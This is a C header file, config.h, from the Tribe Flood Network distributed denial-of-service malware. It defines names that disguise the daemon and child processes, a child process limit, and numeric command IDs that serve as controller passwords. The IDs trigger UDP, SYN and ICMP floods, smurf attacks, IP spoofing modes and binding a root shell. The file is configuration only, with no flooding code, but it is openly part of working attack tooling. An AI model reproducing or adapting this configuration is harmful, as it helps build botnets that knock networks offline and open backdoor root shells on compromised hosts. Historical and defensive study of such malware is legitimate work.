#ifndef _CONFIG_H

/* user defined values for the teletubby flood network */

#define HIDEME "tfn-daemon"
#define HIDEKIDS "tfn-child"
#define CHLD_MAX 50

/* #define ATTACKLOG "attack.log" keep a log of attacks/victims on all
   hosts running td for debugging etc. (hint: bad idea) */

/* These are like passwords, you might want to change them */

#define ID_ACK		123	/* for replies to the client */
#define ID_SHELL	456	/* to bind a rootshell, optional */
#define ID_PSIZE	789	/* to change size of udp/icmp packets */
#define ID_SWITCH	234	/* to switch spoofing mode */
#define ID_STOPIT	567	/* to stop flooding */
#define ID_SENDUDP	890	/* to udp flood */
#define ID_SENDSYN	345	/* to syn flood */
#define ID_SYNPORT	678	/* to set port */
#define ID_ICMP		901	/* to icmp flood */
#define ID_SMURF	666	/* haps! haps! */

#define _CONFIG_H
#endif
